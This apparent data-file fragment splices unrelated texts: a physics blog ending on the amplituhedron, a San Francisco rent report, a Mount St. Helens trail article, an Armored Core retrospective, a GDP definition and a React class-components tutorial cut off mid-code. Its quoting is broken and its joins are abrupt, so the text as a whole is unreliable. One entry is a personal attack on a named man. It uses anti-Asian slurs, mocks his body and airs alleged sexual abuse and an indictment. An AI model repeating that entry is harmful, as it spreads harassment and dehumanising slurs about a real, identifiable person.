bigger hope then is that superstring theory also has enough supersymmetry for a similar idea to work. This would presumably require superstring theory to have the same dual superconformal symmetry as super Yang Mills, or some other even more elaborate infinite dimensional symmetry. Nothing like that is currently known.\n\nPart of the story of the amplituhedron is the idea that space, time, locality and unitarity are emergent. This is exciting because people have always speculated that some of these things may be emergent in theories of quantum gravity. In my opinion it is too strong to call this emergence. Emergence of space-time implies that space and time are approximate and there are places such as a black hole singularity where they cease to be a smooth manifold. The amplituhedron does not give you this. I think it is more accurate to say that with the amplituhedron space-time is derived rather than emergent. It is possible that true emergence may be a feature in a wider generalisation of the theory especially if it can be applied to quantum gravity where emergence is expected to be a feature. Having space-time and unitarity as a derived concept may be a step towards emergence but it is not the same thing.\n\nFor what my opinion is worth I do think that this new way of looking at quantum field theories will turn out to something that generalises to something that is really part of nature. I have advocated the idea that string theory has very large symmetries in the form of necklace algebras so these ideas seem on the right track to me. However I do think that many more advances will be required to work up from super yang mills to sugra and then string theory. They will have to find a way to go beyond the planar limit, generalise to higher dimensions, include gravity and identify the relevant symmetries for string theory. Then there is just the little issue of relating the result to reality. It could be a long road.",
  "latent_10433": "The \"real estate is crazy\" angle is getting tired, I know. And remember how a few months ago we were saying, \"Oh, maybe there's no real reason to panic about rents?\" Well, we're now in the second straight month of beating out New York City in the category of most expensive median one-bedroom rental, clocking in at $3,200 for September. That's right. Median. Right in the middle. Meaning half the one-bedroom rentals in S.F. are actually now more than $3,200.\n\nAs Curbed reports, this figure is up from $2,813 in January, and up from $2,713 in August 2013.\n\nMedian one-bedrooms in New York these days: $2,950.\n\nAccording to Zumper, August marked the first time this median figure pulled ahead of New York, perhaps since ever.

  "latent_10463": "The Boundary Trail helps tell the story of the landscape of Mount St. Helens. Photo by Matt Reeder.\n\nAfter the 1980 eruption of Mount St. Helens, trail designers suddenly had a blank slate to work with. Here’s how they shaped the paths we walk today, both near the volcano and far beyond | by Steve Olson\n\nLook at the history of trails and a common theme emerges. Originally, most trails were utilitarian—a means to an end. But hikers are looking for an experience; they value the journey as much as the destination. As a result, the nature of trails has slowly changed, as new trails are built or old ones are redesigned.\n\nIn one case, however, the change was dramatic and literally explosive—and it’s a fascinating example of how trails can be designed to provide an experience and tell a story.\n\nThe Loowit trail helps tell the story of the landscape of Mount St. Helens. Photo by Missy Fant.\n\nThe May 18, 1980, eruption of Mount St. Helens obliterated the existing trail system around the volcano. That gave recreation planners a blank slate on which to draw a new trail system, and they did so in a way that offers a case study in a new style of trail design.\n\nMost trails have a purpose rooted in history, says Francisco Valenzuela, who was the recreation planner for the Mount St. Helens National Volcanic Monument when it was created in 1982. A trail might have led to a cabin or lookout or it might have served as an old road or rail bed.\n\nAround Mount St. Helens, however, “most of the trails were developed after 1980, so almost none had an older purpose for being,” Francisco says. Instead, the monument’s planners decided that trails should allow visitors to appreciate the geological, biological and cultural features of the monument while protecting fragile ecosystems and landscapes.\n\n“We wanted to let nature do its own thing and not get in the way—which is a smart idea when it comes to volcanoes, because they do their thing no matter what,” - Francisco Valenzuela\n\nFor every trail that planners considered, they asked themselves, “What story should this trail tell?” A trail might be designed to show hikers how the land is recovering. It might reveal a consequence of the 1980 eruption. It might lead to a spectacular view or isolated lake. “A trail is like a play,” Francisco says. “It needs a narrative.”\n\nTo tell that story the best possible way, trail crews laid out several options for each potential trail, says Jim Slagle, who was the Gifford Pinchot National Forest trail engineer during the development of the system. Trail planners then reviewed each of the alternatives and chose the best. “For every mile of trail we built, we probably laid out five to eight miles of trail as alternatives,” Jim says.\n\nThe trails have varying difficulty levels. For example, the Independence Pass Trail that leads to a view of the volcano over the eastern arm of Spirit Lake was designed to provide an easy hike that would attract families and day-trippers. It has logs where hikers can sit and rest and a wide, smooth tread so that groups can pass each other easily. In contrast, trails just a few miles away around Mount Margaret are steeper and chiseled into the sides of steep slopes, offering an experience that only seasoned hikers are likely to enjoy.\n\n\"The Dome\" rises above the Boundary Trail in the Mount. St Helens National Volcanic Monument. Photo by Ryan Cole.\n\nBuilding trails after the eruption presented unique challenges, Jim recalls. Many trails passed through areas where the force of the eruption had blown down entire forests. Trail planners did not want to create a path through the forest with chain saws, because that would make hikers feel that they were walking in a tunnel carved through the trees. Instead, crews used heavy winches to move downed trees out of the way. They also relied on more forceful measures. Most of the trees were badly splintered by the blast. To create trails, the crews therefore drilled holes in downed trees, inserted dynamite and blew the trees out of the way. “The trees were already splintered, so it looked like the eruption had done that,” Jim says.\n\nFor many trails, a prominent goal was, as Robert Moor says in his book “On Trails,” “somewhat paradoxically, to artificially create something natural.” The Butte Camp Trail, for example, passes through a lava field with spectacular views. Trail crews brought in gravel and dirt to create a path that wends through the lava boulders. “The trail does not call attention to itself,” Francisco says. “It looks like the trail has always been there. It feels like it belongs. It’s a hidden art.”\n\n\"It looks like the trail has always been there. It feels like it belongs. It's a hidden art, \" - Robert Moor\n\nOther trails have more obvious purposes. The summer climbing trail to the south rim of the crater passes quickly through a sensitive forest area and then reaches a section of exposed basalt, where the rock limits the environmental damage caused by large numbers of hikers. Once above the rock outcroppings, the trail heads straight up the mountain without switchbacks to get hikers where they want to go as quickly as possible.\n\nThe ground surface around the volcano remains very dynamic, which presented another challenge to trail builders. For example, the Loowit Trail that rings the mountain at about the level of the former treeline is difficult to sustain, as loose ground material washes out and canyons around the mountain erode. But for ambitious hikers who are willing to improvise, it offers an unparalleled opportunity to see the volcano close up and from every direction.\n\nThe opportunity to create an entirely new trail system after the eruption was unique, says Francisco. But, he adds, the approach used there could be much more widely applied. Trails in the Pacific Northwest and elsewhere could be reengineered and relocated to accommodate the larger numbers of people looking for wilderness experiences. Easy and shorter trails could serve most hikers, while harder trails cater to more advanced hikers. More loop trails could be created, they’re less crowded than out-and-back trails. Public transportation to trailheads and parking lots could be reconfigured to help people get to hiking areas while also limiting the overuse of trails.\n\nWTA Crews work on a challenging project on the Loowit Trail. The shifting landscape makes planning maintaining trails challenging. Photo by Ryan Ojerio.\n\nSuch an approach is part of the broader sustainable trails movement, which seeks to limit the environmental impacts of hikers while still encouraging people to get outside. That was the goal at Mount St. Helens, says Dave Seesholtz, a former resources assistant for the Giff ord Pinchot National Forest. Planners sought input from trail users while designing trails that could stand up to those uses. “We could build trails for the purposes they were intended to have,” Dave says.\n\nLend a Hand\n\nIt takes a lot of work to keep trails in good shape around Mount St. Helens. In partnership with the Mount St. Helens Institute and with support from the National Forest Foundation, WTA has a number of upcoming trips planned.\n\nAs Francisco puts it, “Nature needs us to help sustain it, and we need nature to help sustain us. Both those purposes are fundamental goals of outdoors recreation design.”\n\nThat’s a goal WTA has embraced in its work, including at Mount St. Helens. Ryan Ojerio, Southwest Washington regional manager for WTA, has done a lot of work around the volcano and will do a lot more over the coming years. The experience is a vital consideration.\n\n“While building the Volcano View Trail, we were challenged with the task of transforming an old logging road into a forest path,” Ryan says. “The efficient route would have gone right up the middle of the road, but we designed in curves, dragged huge logs across parts of the old roadbed and splintered chain-saw cut stumps by hand with Pulaskis to give it a more natural feel. It is ironic that a trail that is in harmony with the natural landscape takes so much more thought and effort to design and construct. But the initial investment pays off in the added value it brings to hikers’ experiences and the reduction in long-term maintenance costs.”\n\nThis article originally appeared in the May+June 2017 issue of Washington Trails Magazine.

The opinions expressed in this piece are solely his own.\n\nWhen you think of freak shows, you think of people with uncommon physical characteristics.\n\nA strongman who can pull a monster truck down the street with his teeth, a women towering at eight feet, or a boy so flexible he can contort himself into a suitcase. But what about people with freakish personalities? What about men and women so vile and hateful their existence can only be described as a freak show attraction?\n\nThat’s exactly how I felt when I met Hank Yoo. “This boy belongs in the fucking circus.”\n\nWith his durian-shaped head and translucent skin, Hank looks like your average LARP enthusiast. But underneath his squishy exterior hides a rotten personality engorged with explicit anti-semitism, Islamaphobia, and sexism, all wrapped in Eugenics-era racism.\n\nTo call Hank Yoo a racist would be an understatement. Hank believes in scientific racism, a branch of pseudoscience that uses incomplete scientific evidence to support racist ideologies. Throughout history, scientific racists have been responsible for spreading toxic stereotypes such as “Blacks have small brains but big muscles” and “Asians have big brains but small penises.”\n\nWhy would Hank, an Asian-American, believe in the same stereotypes that have been used to dehumanize him? Why is he supporting White supremacy, a system of beliefs that has never, and will never, give a damn about Asians?\n\nSimple: Hank Yoo is insecure as fuck. Hank created this exaggerated Asian cowboy personality to help assimilate into the predominantly White neighborhoods of Tyler, Texas, and to conceal his insecurity about being ethnically Asian and a victim of sexual abuse.\n\nNo One Likes Hank. Especially White People\n\nAs an Asian person, I could never live in a small town like Tyler. With a population that’s 50% White (80% in the 1990s when Hank was born) it’s easy to see how any person of color could be pressured to assimilate and lose every trace of their ethnic identity.\n\nEven though this yellow monkey dances to entertain his White peers, the people who denigrate and harass him on social media are almost always White. Hank’s friends and fans are quick to call him a gook, chink, or a little dick Asian.\n\nAnd Hank takes it. In fact, I think he likes it.\n\nScroll through the public posts of Hank Yoo’s Facebook profile and it’s clear that he’s desperate to compensate for his Asianness by pandering to White supremacists. He constantly praises White people as the “master race,” hanging onto his 8% German ancestry (lol) as if that microscopic Whiteness is enough to overlook his obviously Asian face.\n\nHank is every White supremacist’s wet dream: an Asian boy toy who will uplift White supremacy and downplay people of color. And for what? A seat at the table of Whiteness? The same table of White people who called him a “chink eyed lil fuckboy”? To add to the cringe bonanza, Hank wears a straw fedor– cowboy hat to distract you from the fact that he’s the son of Korean immigrants.\n\nI’ve been trying to figure out where all this racism came from. Who hurt him? I wouldn’t be surprised if he was born a piece of shit, but something had to be the catalyst for his 24/7 teen angst and fragile machismo. The only question is, what is responsible for all this?\n\nOr rather… who?\n\nUnderstanding Hank’s Obsession with Single Mothers\n\nIn addition to his Islamaphobia, racism, and anti-semitism, Hank Yoo has a bizarre fixation with shaming single mothers. Sandwiched between his daily dose of racism are paragraphs and one-liners about single moms who he labels “whores” and “degenerates.” But a quick scan through his shitposts and you’ll see exactly where this sexist mentality came from: his own mother.\n\n“I was raised in a single parent household. They were never married. I was constantly abused by my dad and neglected by my mom. My [mom] is a coward and a slut. My dad is a fucking psychopath.”\n\nHank is the president of his own fucked up world. A world where all single mothers are abusers responsible for the men who abandon them. In his world, Hank isn’t a sexist, he’s an activist for children and nuclear families. Hank is a patriot who would never do anything to compromise the integrity of the law.\n\nJust kidding.\n\nOn December 2, 2016, Heon Jon Yoo and three Texas men were indicted for aggravated assault with a deadly weapon. Authorities on the scene found “a tactical vest, three magazines, a handgun, two rifles, a machete, and a shotgun.”\n\nThat One Time in Band Camp\n\nI’ve spent hours sifting through Heon Jon Yoo’s posts and I’ve had to take 15 minute breaks to wash the taste of tap dancing from my mouth. But the most revealing information throughout my research came from Heon Jon Yoo’s own mouth (literally.)\n\nAs part of a fraternity initiation, Heon Jon Yoo allegedly gave two White males oral sex.\n\nI relish the moments when Heon gets berated by his White peers, but I would never — even in the case of someone as racist and toxic as Heon — wish for sexual assault or rape upon someone else. What happened to Heon, even if he gave full consent, sounds like blatant sexual coercion. As much as we want to demonize every inch of Heon’s life, we can’t escape the reality that in college, Heon Jon Yoo’s initiation experience may have shaped his dangerous, racist ideologies.\n\nHeon was emotionally abused by his mother, physically abused by his father, culturally dehumanized by his friends, and sexually abused by his “friends.”\n\nI will never understand the pain of prolonged abuse and the toll it takes on one’s mental and emotional health. But one thing is for sure — no amount of abuse could ever justify Heon Jon Yoo’s history of violence, racism, anti-semitism, and Islamaphobia.\n\nHank is a piece of shit because Hank is a piece of shit. He is responsible for his own hell. He resorted to racism and abuse as coping mechanisms. Heon did this on his own. He bottled it up and unloaded his aggression and pain onto Muslims and black communities.\n\nMaybe his constant uplifting of the White and aryan race is a strategy he uses to justify the horrific acts of college. In Heon Jon Yoo’s mind, perhaps he didn’t experience sexualized hazing but instead, recognized the supposed greatness of Whiteness.\n\nYou can also see this White-worshiping behavior when he talks about his dating preferences. Heon, like Ling Anderson, ranks White people above all else, and he’s eager to showcase all of the White women he has been intimate with.\n\nIt’s embarrassingly obvious what he’s trying to do. Heon wants Asians to believe that his sexual history with White women has transcended him above the average Asian, and he wants White men and women to take his Asian masculinity seriously because “see? I can get White women so I must be a real man!”\n\n“Heon” Is The Loneliest Number That You’ll Ever See\n\nAbandoned by his parents and abused by his peers, Hank Yoo is at peace with his worthlessness. He’s comfortable wishing death upon Black and Brown people because deep down, he has nothing to live for, so why should anyone else?\n\nDisqualified from the Army for his political views (the Army doesn’t want pro-Nazi soldiers) and fired from his previous job, the only thing left in Heon Jon Yoo’s life is the freakshow personality he created. A sideshow attraction for White trash racists and White supremacists. All Heon can do now is put on his cowboy hat, and dance for racist White people in hopes that he’ll get something in return to soothe his self-inflicted wounds.\n\nDance, monkey, dance.",

With much of the narrative conveyed via e-mails in the front-end menu, the story took on a quite voyeuristic tone where everything was not as it initially appeared.\n\nAs this was the first mecha game From Software had ever made, as prior to this the studio's biggest selling games were from the King’s Field series, it made sense that the studio approached someone like Shoji Kawamori for the game's mecha design.\n\nNot only was he one of the original creators behind Macross, Kawamori was and still is a remarkably talented as well as respected mecha designer in his own right. When I interviewed him back in 2015, he was more than happy to explain how he got to work on this project and how its name came about.\n\nWhen the design for Armored Core was requested to me, it was before the original PlayStation was launched. There were quite a lot of unknowns and there were ideas for separate parts, such as arms, feet and weapons and so on. These then had to be combined by the player on their own. However, if you allow a player to create their own mecha it makes it very hard to give it a sense of visual identity. Such as clearly differentiating from other mecha anime and games. I also thought that other games would follow suit when this was released. As I believed that this idea should differentiate this game from the rest of its competition, I proposed the concept of the “armored cores”. Meaning that of the core block with cockpit and engine as well as the joint connectors for head, arm legs, weapons and so on. They adopted the proposal and called it Armored Core as a consequence.\n\nFocusing on the “core” for each design then gave the player not only something to focus their customization around but it helped to give each mecha a recognizable silhouette, not only for the player but their opponents as well.\n\nThis is because the original Armored Core wasn’t just a single player game, as it also had a very solid multiplayer component to it. Going up against a friend and changing your respective builds to counter one another’s tactics is something that is still refreshing and unique even today.\n\nFollowing the release of the first Armored Core in July of 1997, it sold surprisingly well and shifted the studio’s focus over to making more mecha games. Released later in the same year in the U.S. it also went on to sell quite well and began to build a global fanbase for the series as a whole.\n\nUnlike the MechWarrior or Heavy Gear games, Armored Core was a faster paced and more arcade take on mecha simulation. While you had to manage your energy output with boosting, as well as avoid spooging away all your ammo (as solid ammunition cost money to use), the combat was a lot more fluid and direct compared to Western mecha games of that era.\n\nThis was in part down to the removal of things such as torso twisting, as in MechWarrior, and the use of a square box targeting system called an FCS. The latter meant you had to simply get your target into the targeting frame and close down the range to get a lock. This meant your guns and missiles could use the same targeting system and it helped unify what would have been a very complex system into something much more accessible.\n\nUnlike the more analog approaches to mecha simulation, Armored Core distilled elements from those and made something far more streamlined and intuitive. That said, the original controls for Armored Core were a bit on the clunky side, as to look up and down was initially mapped to the shoulder buttons but this setup was eventually rectified in later releases in the series.\n\nThe only sad thing with this anniversary is that the last entry in the series was Armored Core Verdict Day and that was released back in 2013. With the rise of the Souls games, From Software has moved away from its mecha gaming heritage. However, we may yet see a new Armored Core game in the future but what that will end up being is anyone’s guess at this point.\n\nIn any case, the original Armored Core irrevocably changed the world of mecha gaming 20 years ago and its legacy is still with us today. While the series is currently sleeping, it is by no means dead and I am sure the games will be recruiting more Ravens sometime in the not too distant future.\n\nIf you are at all curious about the first Armored Core, then you can still buy the game on the U.S. PSN store for $5.99 and play it on both your PS3 and Vita.\n\nFollow me on Twitter, Facebook and YouTube.

  "latent_10659": "Gross domestic product (GDP) is a monetary measure of the value of all final goods and services produced in a period of time. GDP estimates are commonly used to determine the economic performance and standard of living of a whole country or region, and to make international comparisons.\n\nGDP is not a complete measure of economic activity. It accounts for final output or value added at each stage of production, but not total output or total sales along the entire production process. It deliberately leaves out business-to-business (B2B) transactions in the early and intermediate stages of production, as well as sales of used goods.\n\nGDP attempts to measure the “use” economy, i.e., the value of finished goods and services ready to be used by consumers, business and government. GDP is similar to the “bottom line” (earnings) of an accounting statement, which determined the “value added” or the value of final use. GO is an estimate of the “make” economy, i.e., the monetary value of sales at all stages of production. Thus, GO is similar to the “top line” (revenues or sales) of an accounting statement.

  "latent_10708": "James K Nelson James is the editor of React Armory, and has been creating things with JavaScript for over 15 years. Read more by JamesFollow @ james_k_nelson on Twitter\n\nOne of the great things about React’s function components is that they’re declarative. Instead of forcing you to update the DOM step by step, function components let you say “I want these props to result in this element” – and then it’s all good!\n\nOf course, being declarative means that everything must be passed through props . And this is usually a good thing; it forces you to separate business logic from view logic, making your components magically reusable. But the props still have to come from somewhere…\n\nWhy Store State?\n\nFunction components are no good by themselves. They need information (sometimes called state) to be fed to them through props . And the larger your app grows, the more code you’ll need to feed this state through.\n\nTake this timer for example. Even though the TimerDisplay component and Timer class are imported from a library, it still takes 5 lines of code to connect them:\n\nmain.js Timer.js index.html import { TimerDisplay, Timer } from './Timer.js' /** * Instances of the `Timer` class can be used to measure time (in seconds). * * `timer.start()` starts increasing the value stored in `timer.time` * `timer.stop()` stops increasing `timer.time` * `timer.reset()` resets `timer.time` to 0 * `timer.active` is true when `timer.time` is increasing */ const timer = new Timer(render) function render() { if (timer.time >= 60*25) { timer.stop() alert('Tomato!') } ReactDOM.render( React.createElement('div', {}, React.createElement(TimerDisplay, { title: 'POMODORO', // These 5 lines connect the Timer with the TimerDisplay time: Math.max((60*25 - timer.time)/60, 0), active: timer.active, onStart: () => timer.start(), onStop: () => timer.stop(), onReset: () => timer.reset(), }) ), document.getElementById('app') ) } render() Compiled Build In Progress Console Console\n\nBut consider that in the real world, the TimerDisplay would be nested within many levels of components. Just like this one:\n\nSTART RESET\n\nYep, this article is a React Component! You can inspect it using the React Dev Tools.\n\nThis timer is nested within 14 (!) other components at the time of writing – starting with React Armory’s root Application component, which nests components that handle routing, which nests components that handle page layout, which nests components that render the article itself, which then nests a TimerDisplay component.\n\nAnd nobody wants to manually pass objects through 14 levels of props.\n\nThe thing is, it isn’t always practical to pass all of your state down from the application root. But function components don’t give you any other choice. They’re too dumb; they can’t do anything except render outside information.\n\nBut what if there was a way to create smart components that manage their own state? Components that could implement business logic and communicate with the outside world…\n\nTwo Types Of Components\n\nOne of React’s defining features is that it allows you to create custom element types, called components. And while so far this guide has focused on defining components with functions, React also lets you define components with classes.\n\nBut why have two types of components? Well, as you know, function components are a little limited. All they know about is their current props . They can’t access previous props or external state. And they’re only re-rendered when their parent is; they can’t be re-rendered individually.\n\nIn contrast, class components give you the power to store state, communicate with the outside world, and re-render whenever you’d like. But class components can be simple, too! In fact, any function component can also be implemented as a class component.\n\nSo how do I define class components?\n\nYou just wrap a function component in a class! There are only three rules you’ll need to follow:\n\nThe class must extend from React.Component\n\nYour method that returns a React Element must be called render()\n\nProps are accessed through this.props instead of through function arguments\n\nThe best way to understand this is to see it in action, so let’s take a look at some real components.\n\nIn this example, there are two components that do exactly the same thing – they center text. The only difference is that Center1 is defined as a function, while Center2 is defined as a class:\n\nmain.js index.html const createElement = React.createElement // A Function Component function Center1(props) { const style = { textAlign: 'center' } return createElement('div', { style }, props.children) } // Class components always extend from `React.Component` class Center2 extends React.Component { // At minimum, class components have a `render()` method render() { const style = { textAlign: 'center' } // Props are accessed via `this.props` return createElement('div', { style }, this.props.children) } } ReactDOM.render( createElement('div', {}, createElement(Center1, {}, createElement('h1', {}, 'Centered Text')), createElement(Center2, {}, createElement('h1', {}, 'More Text')) ), document.getElementById('app') ) Compiled Build In Progress Console Console\n\nFunction components and class components can look pretty similar. In fact, a function component is basically just the render() method from a class component, with this.props passed in as an argument.\n\nBut if the two types of components are so similar, how is it that class components can be so much more powerful?\n\nFunctions vs. Methods\n\nHave you ever thought about the difference between a function and a method? At the surface level, the two concepts are almost identical. And indeed, functions and methods both do basically the same thing. But there is one major difference. Do you know what it is?\n\nShow answer Methods have access to an object called this . Functions only have access to whatever information is passed in via arguments.\n\nAt first, this might not seem like an important distinction. But it has an important consequence. While function components can only access their current props , methods can store information on this and access it on subsequent renders.\n\nClasses are just classes\n\nOne thing to understand about class components is that they’re just JavaScript classes.\n\nThis means that there is nothing special about the render() method; it’s just a method that React calls when it wants to render the component.\n\nIt also means that there is nothing special about this ; it’s just a JavaScript object. You can set values on this . And then you can read them back later.\n\nIn fact, React classes are so unremarkable that it can be hard to believe that they’re just classes. But seeing is believing, and that’s why it’s time for an exercise!\n\nIn this exercise, you’ve been provided with two counters. The counter labeled “Expected” shows the number of times that renderApp() has been called. The other counter, labeled “Actual”, shows “-1”.\n\nYour task is to make the “Actual” counter match the “Expected” counter, by converting the SecondCounter component into a class component, and incrementing this.count on each render. Once you’ve completed it, compare your class with my solution. But only once you’ve completed it, otherwise you won’t learn anything!\n\nmain.js Timer.js index.html import { TimerDisplay } from './Timer.js' function SecondCounter() { // `this` doesn't exist in function components. I guess you'll need to turn // this into a class component! const count = this ? this.count : -1 return React.createElement(TimerDisplay, {time: count, title: 'ACTUAL'}) } function renderApp(count) { ReactDOM.render( React.createElement('div', {}, React.createElement(SecondCounter), React.createElement(TimerDisplay, {time: count, title: 'EXPECTED'}) ), document.getElementById('app') ) setTimeout(() => renderApp(count + 1), 1000) } renderApp(1) Compiled Solution Build In Progress Console Console\n\nAnd there you have it! Class components are just classes. They can do anything a class can do. And unfortunately, classes can’t actually do all that much…\n\nRerendering revisited\n\nImagine for a moment that you want to set some state each time the user clicks a button. For example, you might want to set this.time = 0 when the user clicks the timer’s “reset” button. Which will work… kind of. The thing is, while the instance variable will change, React won’t actually render the change.\n\nRemember how I mentioned back in Rendering and Re-rendering that React will only re-render when you call ReactDOM.render() ? In the context of class components, this becomes problematic. You don’t want every component in your application to depend on some global function that re-renders your entire app.\n\nLuckily, I was lying when I said that React only re-renders on ReactDOM.render() . Because React also re-renders when you call a component’s setState method.\n\nThe setState method\n\nOne of the rules of React component classes is that they must extend from React.Component . As a result of this, your classes will inherit a bunch of methods – the most important of which is setState .\n\nWhen you call this.setState(state) from within your class, the following will happen:\n\nThe properties of the passed in state object will be copied onto this.state (but this.state won’t change immediately – more on this later) React will then re-render your component and its nested components\n\nSimple, right? There are just two things to be careful of:\n\nYou can’t use setState within the render method. This is because calling setState results in a re-render, so calling setState within render would result in an infinite loop.\n\nYou can’t use setState within your class constructor. This is a little less obvious, but I assure you that there is a good reason – which we’ll get to in a bit.\n\nOf course, you’re probably more interested in what you can accomplish with setState . And the answer is that…\n\nsetState makes self-contained components possible\n\nWhat do I mean by self-contained? Well, by calling setState from your event or timer callbacks, you can save any information that you receive directly to the component instance. Your state no longer needs leave the component at all!\n\nThis is one of the most important concepts in React, so it would be irresponsible of me to not say please oh please actually do this exercise.\n\nLet’s try setState\n\nIn this exercise, your task is to implement a self-contained component. I’ve started you off with a component that half works – you’ll need to finish it by adding some calls to setState .\n\nBut where do you need to call setState ? You can figure it out by using this rule: your component only re-renders when this.props or this.state change.\n\nActually, the component won’t re-render if you directly set this.state instead of setting it with setState . So my rule isn’t 100% precise. Deal with it.\n\nThis means that if you want your component to re-render when a certain piece of information changes, you’ll need to save that information with setState .\n\nOnce you’ve completed the exercise, you should have two working timers – and you should be able to start/stop the timers independently.\n\nIf you do run into any trouble, you can check my solution below. And remember – if you check the solution without giving it a go first, you’re a dirty cheat!\n\nmain.js Timer.js index.html import { Timer, TimerDisplay } from './Timer.js' class TimerContainer extends React.Component { // The constructor is called before the first call to `render`. But why // `props`? Why `super`? We'll get to that in a moment... constructor(props) { super(props) this.timer = new Timer(() => { // EXERCISE: this function is called when `this.timer.time` changes }) } render() { return React.createElement(TimerDisplay, { time: this.timer.time, active: this.timer.active, // EXERCISE: these callbacks aren't quite done onStart: () => this.timer.start(), onStop: () => this.timer.stop(), onReset: () => this.timer.reset(), }) } } ReactDOM.render( React.createElement('div', null, React.createElement(TimerContainer), React.createElement(TimerContainer) ), document.getElementById('app') ) Compiled Solution Build In Progress Console Console\n\nIf you’re reading this, I’m assuming you’ve given the exercise a decent crack and got the timers working one way or another, so congratulations! setState is the bread and butter of your business logic, so using it will soon become second nature.\n\nAnd while we’re on the topic of the exercise, did you notice how I used a constructor ? This shouldn’t be too much of a surprise – after all, class components are classes, and classes have constructors. But it does raise the question: how are your components actually instantiated?\n\nComponent Instances\n\nIf you’ve worked with JavaScript classes before, you’ve probably created class instances with new MyClass() . But while class components are classes, you should never actually use new on them. Instead, you’ll pass your classes to React.createElement() and let React handle instantiation for you.\n\nAnd this raises the question: when does React actually instantiate your components? This question can be a bit tricky, but is also a good way to check your understanding of React so far. So have a little think about it before checking your answer below.\n\nShow answer React creates new component instances when it first creates a DOM node for an element. This means that React does not create a new instance when you call React.createElement() . Remember that React.createElement() only describes what to render, while ReactDOM.render() actually updates the DOM.\n\nWhile function components are called on each render, a class component only needs to be instantiated on its first render. On subsequent renders, React will just update this.props and then call render() ; it won’t create a whole new component instance.\n\nIn a way, class components are like function components that receive a special this prop.\n\nReact treats two elements with different key props as different, even if the component type is the same. This means that if you change a component’s key , React will discard the instance and instantiate a new one.\n\nAnd that answers the question of when components are instantiated. So let’s go back to the original question: how? And the answer is: React just calls new MyComponent(props) . Which in turn calls your class’ constructor. Simple, huh?\n\nBut why does the constructor receive props ?\n\nConstructors\n\nWhen a class instance is first instantiated by JavaScript, it will be completely empty. Instance variables like this.props and this.state will be undefined . And it’s the constructor’s job to initialise them.\n\nBut that doesn’t mean that you need to write a constructor for every component!\n\nJS Reference One of the oddities of JavaScript classes is that every constructor in the entire inheritance chain must be called. And that means that a class that extends another class must call super within the constructor (if it has a constructor).\n\nRemember how component classes extend from React.Component ? Because of this, React is able to provide a base constructor that sets this.props to the passed in argument. You’ll never need to set this.props yourself.\n\nOf course, sometimes you’ll want to perform other initialisation, and that’s where custom constructors come in.\n\nBy giving your class a custom constructor , you’re able to specify code that should run before your component does anything else. This has countless uses, but there are two in particular that I often see in the wild: setting initial state, and binding event handlers. So let’s take a look at these in detail.\n\nSetting initial state\n\nReact doesn’t give this.state a default value; initially it is undefined . So if your render method uses state, you’ll make your life easier by setting an initial state in the constructor. There’s just one problem: setState doesn’t work in the constructor.\n\nLuckily, if you’re in the constructor, you don’t need to use setState ! You can simply set a value:\n\nconstructor ( props ) { super ( props ) this . state = { } }\n\nReact doesn't instantiate components unless it needs to render them.\n\nIn general, you don’t want to directly set this.state like this; you should use setState to ensure that your component will be re-rendered. But within a constructor, you know that a render is already scheduled. This means that setState is unnecessary, and a simple assignment will suffice.\n\nBinding event handlers\n\nYou’ll often find that your event handlers need to call this.setState , which in turn means they need access to this . And this probably seems painfully obvious, but there is a good reason for saying it:\n\nIn JavaScript, methods are not guaranteed to have access to this .\n\nConsider this component:\n\nmain.js Timer.js index.html import { TimerDisplay } from './Timer.js' class BrokenTimerContainer extends React.Component { render() { return React.createElement(TimerDisplay, { time: 1e50, // This might not do what you think it does onReset: this.reset, }) } reset() { // `this` is null? alert(this) } } ReactDOM.render( React.createElement('div', null, React.createElement(BrokenTimerContainer) ), document.getElementById('app') ) Compiled Build In Progress Console Console\n\nAt first glance, it looks like we’ve passed the reset method to TimerDisplay as an onReset callback. But if you actually click the “RESET” button in the preview window, you’ll find that the reset method isn’t a method at all; it doesn’t have access to this !\n\nTo test your understanding of this, let’s do a little quiz: can you explain the reason that this doesn’t exist? Spend a few moments on this, then check your answer below.\n\nshow answer In a JavaScript method, the value of this has nothing to do with the class on which it was defined. Instead, it depends on the object that it was called upon. In terms of . syntax, this means that if you call obj.someMethod() , the value of this within someMethod will be obj – regardless of where someMethod was originally defined! If you just call someMethod() without using a . , this will be null . There are two important exceptions: You can force a specific value of this with a function’s call , apply and bind methods\n\nwith a function’s , and methods If the function is an => arrow function, this is hard-wired to refer to the value of this at the location where the function was defined None of these exceptions apply in the above example, and you don’t know how reset is called (because it is called within the TimerDisplay component). As such, you have no idea what this will be!\n\nJS Reference My explanation of this is a bit like high school chemistry; it’s a nice idea but it may give an expert a heart attack.\n\nIf all you want to do is use React, it is probably good enough. But otherwise go read the details at MDN.\n\nHow’d you go? Don’t worry too much if you’re a little confused; this is confusing, even for the experts. But there is one important thing that you need to remember:\n\nOnce you’ve passed a method as a callback, you have no idea how it will be called, and thus no idea what this will be.\n\nUnless, of course, you use an => arrow function or force this to a known value with bind .\n\nArrow functions vs. bind\n\nYou may have noticed that in the examples above, the callbacks we passed to TimerDisplay were all defined as arrow functions. This has the benefit of ensuring that this is available, but it also has a problem: it can be a major performance drag.\n\nThe problem here is that each time an => is encountered, it creates a new copy of the arrow function. And in JavaScript, creating functions is a costly operation.\n\nTo get around this, React developers will often replace all of their event callbacks in the constructor with bound versions, like so:\n\nJS Reference If you’re building your source with babel or create-react-app, you can avoid writing bind in your constructors by defining callbacks with property initializer syntax. For example: class Timer extends Component { reset = ( ) = > { this . setState ( { time : 0 } ) } }\n\nconstructor ( ) { this . reset = this . reset . bind ( this ) } reset ( ) { this . setState ( { } ) }\n\nBy using bind this way, you’ll ensure that this behaves as you expect it to, while also avoiding the performance issues inherent in arrow functions.\n\nA real-world example\n\nClass components give you a lot of options: setState , constructors and method binding to name a few. Of course, the problem with options is that you need to know how to actually apply them. So let’s take a look at how classes are used in practice.\n\nThis example takes the timer from the previous exercise and re-implements it in a more typical fashion. There are two major changes:\n\nThe callbacks have been moved out to separate methods (which are bound in the constructor)\n\nAn initial state has been set in the constructor\n\nmain.js Timer.js index.html import { Timer, TimerDisplay } from './Timer.js' class TimerContainer extends React.Component { constructor(props) { super(props) this.state = { time: 0, active: false } this.timer = new Timer(() => this.setState({ time: this.timer.time })) this.start = this.start.bind(this) this.stop = this.stop.bind(this) this.reset = this.reset.bind(this) } render() { return React.createElement(TimerDisplay, { time: this.timer.time, active: this.timer.active, onStart: this.start, onStop: this.stop, onReset: this.reset, }) } start() { this.timer.start() this.setState({ active: true, time: this.timer.time }) } stop() { this.timer.stop() this.setState({ active: false }) } reset() { this.timer.reset() this.setState({ time: 0 }) } } 